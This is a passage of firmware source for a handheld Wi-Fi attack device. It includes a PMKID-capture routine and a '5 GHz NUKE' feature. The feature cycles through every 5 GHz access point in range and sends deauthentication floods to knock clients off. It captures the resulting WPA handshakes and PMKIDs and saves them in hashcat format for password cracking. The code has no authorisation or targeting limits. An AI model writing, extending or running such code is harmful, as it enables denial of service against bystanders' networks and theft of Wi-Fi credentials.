            draw_status_header();
            d.setTextColor(T_FG, T_BG);
            d.setCursor(4, BODY_Y + 18);
            d.printf("%.22s", aps[chosen].ssid[0] ? aps[chosen].ssid : "<hidden>");
            d.setTextColor(T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 30);
            d.printf("ch%u  %02X:%02X:%02X:%02X:%02X:%02X",
                     aps[chosen].channel,
                     aps[chosen].bssid[0], aps[chosen].bssid[1],
                     aps[chosen].bssid[2], aps[chosen].bssid[3],
                     aps[chosen].bssid[4], aps[chosen].bssid[5]);
            uint16_t col = got > 0 ? T_GOOD : T_ACCENT;
            d.setTextColor(col, T_BG);
            d.setCursor(4, BODY_Y + 46);
            d.printf("PMKIDs  : %d", got);
            d.setTextColor(T_DIM, T_BG);
            d.setCursor(4, BODY_Y + 58);
            uint32_t left = (end > millis()) ? (end - millis()) / 1000 : 0;
            d.printf("time    : %lus  -> hashcat.22000", (unsigned long)left);
            ui_freq_bars(SCR_W - 70, BODY_Y + 16, 4, 36);
            ui_draw_status(radio_name(), "C5-PMKID");
        }
        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) { c5_cmd_stop(); break; }
    }

    /* Final flush + summary. */
    c5_pmkid_t buf[16];
    int got = c5_pmkids(buf, 16);
    for (int i = 0; i < got; ++i)
        if (c5_saved_add(saved, buf[i].pmkid)) save_pmkid_to_sd(buf[i]);
    if (saved.n > 0) {
        char msg[40];
        snprintf(msg, sizeof(msg), "captured %d -> SD", saved.n);
        ui_toast(msg, T_GOOD, 1200);
    } else {
        ui_toast("no PMKID (try deauth first)", T_WARN, 1500);
    }
}

/*
 * feat_c5_nuke_5g — NUKE-ALL for the 5 GHz band via TRIDENT.
 *
 * Rotates through every 5 GHz AP the C5 has seen, firing:
 *   (1) c5_cmd_hs(bssid, channel, 5000)   — promisc listen for M1/M2
 *   (2) c5_cmd_deauth(bssid, channel, 0, 4000) — force re-auth storm
 *
 * The HS capture runs concurrently with the deauth on the C5 side —
 * it's already listening when clients re-auth after getting kicked.
 * Anything caught streams back as RESP_HS and gets written to
 * /poseidon/hashcat.22000 in WPA*02* format. PMKIDs from the same
 * target (if any) flush through the same loop.
 *
 * Runs until ESC. No time-slicing with the S3 side — this is the
 * dedicated C5-only path.
 */
void feat_c5_nuke_5g(void)
{
    radio_switch(RADIO_WIFI);
    c5_begin();
    if (!c5_present()) { ui_toast("no C5 online", T_BAD, 1500); return; }

    c5_ap_t aps[64];
    int n = c5_aps(aps, 64);
    int five_n = 0;
    for (int i = 0; i < n; ++i) if (aps[i].is_5g) aps[five_n++] = aps[i];

    /* Only kick a fresh scan if no 5G APs are already cached. Mirror the
     * working feat_c5_scan_5g path exactly (clear + scan + poll) — the prior
     * c5_cmd_stop() prefix here diverged from it and the sweep came back
     * empty. */
    if (five_n == 0) {
        c5_clear_results();
        /* duration_ms is PER-CHANNEL dwell. Match feat_c5_scan_5g's
         * 300 ms = ~11 s full dual-band sweep. */
        c5_cmd_scan_5g(300);

        auto &dsp = M5Cardputer.Display;
        uint32_t deadline = millis() + 15000;
        bool dirty = true;
        while (millis() < deadline && five_n == 0) {
            /* Chrome drawn ONCE on entry — the title/HR don't change.
             * Per-frame updates use fixed-width printfs with bg-color
             * text so each cell self-overwrites cleanly, no body wipe. */
            if (dirty) {
                ui_clear_body();
                dsp.setTextColor(T_ACCENT, T_BG);
                dsp.setCursor(4, BODY_Y + 2); dsp.print("5 GHz SWEEP");
                dsp.drawFastHLine(4, BODY_Y + 12, SCR_W - 8, T_ACCENT);
                ui_draw_footer("`=abort");
                dirty = false;
            }

            int total_n = c5_aps(aps, 64);
            int cur_2g = 0, cur_5g = 0;
            for (int i = 0; i < total_n; ++i) {
                if (aps[i].is_5g) cur_5g++; else cur_2g++;
            }
            dsp.setTextColor(T_FG, T_BG);
            dsp.setCursor(4, BODY_Y + 20);  dsp.printf("total APs: %-3d", total_n);
            dsp.setTextColor(T_DIM, T_BG);
            dsp.setCursor(4, BODY_Y + 32);  dsp.printf("2.4G: %-3d", cur_2g);
            dsp.setTextColor(cur_5g ? T_GOOD : T_DIM, T_BG);
            dsp.setCursor(4, BODY_Y + 44);  dsp.printf("5G  : %-3d", cur_5g);

            dsp.setTextColor(T_DIM, T_BG);
            uint32_t el = (millis() - (deadline - 15000)) / 1000;
            dsp.setCursor(4, BODY_Y + 60);  dsp.printf("elapsed %-2lu s / 15", (unsigned long)el);

            /* Corner radar — clear just its 30x30 bbox per frame so the
             * sweep afterglow works without wiping the body. */
            dsp.fillRect(SCR_W - 38, BODY_Y + 30, 32, 32, T_BG);
            ui_radar(SCR_W - 24, BODY_Y + 44, 14, T_ACCENT);

            delay(120);
            n = total_n;
            five_n = cur_5g;
            uint16_t k = input_poll();
            if (k == PK_ESC) return;
        }
        /* If we actually have 5G APs now, repack into aps[] top of list. */
        if (five_n > 0) {
            int tmp_n = 0;
            for (int i = 0; i < n; ++i) if (aps[i].is_5g) aps[tmp_n++] = aps[i];
            five_n = tmp_n;
        }
    }

    if (five_n == 0) { ui_toast("no 5 GHz APs found", T_WARN, 1500); return; }

    auto &d = M5Cardputer.Display;
    int cursor = 0;
    uint32_t last = 0;
    uint32_t last_rotate = 0;
    c5_saved_set hs_saved = {};    /* handshakes on SD, keyed by bssid+sta+anonce */
    c5_saved_set pmk_saved = {};   /* PMKIDs on SD, keyed by pmkid[] */
    uint32_t last_rescan = millis();

    ui_draw_footer("`=stop   deauth-all + HS capture loop");

    /* Static NUKE backdrop painted ONCE: full-screen wipe + glitch +
     * scanlines + big headline + C5 indicator. None of this changes, so
     * repainting it every frame was the hard full-screen flash. The
     * dynamic target/stats band repaints in place below. */
    d.fillScreen(0x0000);
    ui_glitch(0, 0, SCR_W, SCR_H);
    for (int y = 0; y < SCR_H; y += 4)
        d.drawFastHLine(0, y, SCR_W, 0x0020);
    {
        const char *headline = "5 GHz NUKE";
        d.setTextSize(3);
        int hw = d.textWidth(headline);
        int hx = (SCR_W - hw) / 2;
        int hy = 22;
        d.setTextColor(0xF81F, 0);
        d.setCursor(hx - 2, hy); d.print(headline);
        d.setCursor(hx + 2, hy); d.print(headline);
        d.setCursor(hx, hy - 2); d.print(headline);
        d.setCursor(hx, hy + 2); d.print(headline);
        d.setTextColor(0xFFFF, 0);
        d.setCursor(hx, hy); d.print(headline);
        d.setTextSize(1);
    }
    d.fillCircle(7, 6, 2, 0x07E0);
    d.setTextColor(0x07E0, 0);
    d.setCursor(13, 2); d.print("C5");

    int last_disp_idx = -1, last_disp_hs = -1, last_disp_pmk = -1, last_disp_five = -1;
    int last_disp_cursor = -1;

    while (true) {
        uint32_t now = millis();

        /* Rotate every 6 s so each C5 command has room to finish. */
        if (now - last_rotate > 6000) {
            last_rotate = now;
            const c5_ap_t &t = aps[cursor % five_n];
            c5_cmd_hs(t.bssid, t.channel, 5000);
            c5_cmd_deauth(t.bssid, t.channel, 0, 4000);
            cursor++;

            /* Rescan every 45 s in case the target set moved. */
            if (now - last_rescan > 45000) {
                last_rescan = now;
                c5_cmd_scan_5g(400);
            }
        }

        /* Every 300 ms: refresh the target list (in case a scan just
         * landed), drain any HS / PMKID captures into the hashcat log,
         * paint the dashboard. */
        if (now - last > 300) {
            last = now;
            int fresh_n = c5_aps(aps, 64);
            int fresh_5 = 0;
            for (int i = 0; i < fresh_n; ++i)
                if (aps[i].is_5g) aps[fresh_5++] = aps[i];
            if (fresh_5 > 0) five_n = fresh_5;

            c5_hs_t hs[8];
            int got_hs = c5_hss(hs, 8);
            for (int i = 0; i < got_hs; ++i) {
                /* Key on bssid+sta+anonce[0..3] — unique per captured handshake. */
                uint8_t key[16];
                memcpy(key, hs[i].bssid, 6);
                memcpy(key + 6, hs[i].sta, 6);
                memcpy(key + 12, hs[i].anonce, 4);
                if (c5_saved_add(hs_saved, key)) {
                    const char *essid = c5_ssid_for_bssid(hs[i].bssid);
                    save_hs_to_sd(hs[i], essid);
                }
            }
            c5_pmkid_t pm[8];
            int got_pm = c5_pmkids(pm, 8);
            for (int i = 0; i < got_pm; ++i)
                if (c5_saved_add(pmk_saved, pm[i].pmkid)) save_pmkid_to_sd(pm[i]);

            /* Repaint the dynamic target/stats band only when it changes,
             * over a targeted rect so the static backdrop stays put. */
            int disp_idx = (cursor ? cursor - 1 : 0) % five_n;
            if (disp_idx != last_disp_idx || hs_saved.n != last_disp_hs ||
                pmk_saved.n != last_disp_pmk || five_n != last_disp_five ||
                cursor != last_disp_cursor) {
                last_disp_idx = disp_idx;
                last_disp_hs = hs_saved.n;
                last_disp_pmk = pmk_saved.n;
                last_disp_five = five_n;
                last_disp_cursor = cursor;

                d.fillRect(0, SCR_H - 46, SCR_W, 46, 0x0000);
                for (int y = ((SCR_H - 46 + 3) / 4) * 4; y < SCR_H; y += 4)
                    d.drawFastHLine(0, y, SCR_W, 0x0020);

                /* Target + stats. */
                const c5_ap_t &t = aps[disp_idx];
                d.setTextColor(0x07FF, 0);
                d.setCursor(4, SCR_H - 44);
                d.printf("-> %.20s", t.ssid[0] ? t.ssid : "<hidden>");
                d.setTextColor(0x8410, 0);
                d.setCursor(4, SCR_H - 34);
                d.printf("ch%u %02X:%02X:%02X:%02X:%02X:%02X",
                         t.channel, t.bssid[0], t.bssid[1], t.bssid[2],
                         t.bssid[3], t.bssid[4], t.bssid[5]);

                char row1[48], row2[48];
                snprintf(row1, sizeof(row1), "%d APs  HS:%d  PMKID:%d",
                         five_n, hs_saved.n, pmk_saved.n);
                snprintf(row2, sizeof(row2), "rotation %d", cursor);
                d.setTextColor(hs_saved.n > 0 ? 0x07E0 : 0xFFE0, 0);
                int w1 = d.textWidth(row1);
                d.setCursor((SCR_W - w1) / 2, SCR_H - 22);
                d.print(row1);
                d.setTextColor(0xFFFF, 0);
                int w2 = d.textWidth(row2);
                d.setCursor((SCR_W - w2) / 2, SCR_H - 10);
                d.print(row2);
            }
        }

        uint16_t k = input_poll();
        if (k == PK_NONE) { delay(20); continue; }
        if (k == PK_ESC) break;
    }
    c5_cmd_stop();
    if (hs_saved.n > 0 || pmk_saved.n > 0) {
        char msg[48];
        snprintf(msg, sizeof(msg), "saved %d HS, %d PMKID",
                 hs_saved.n, pmk_saved.n);
        ui_toast(msg, T_GOOD, 1500);
    }
}
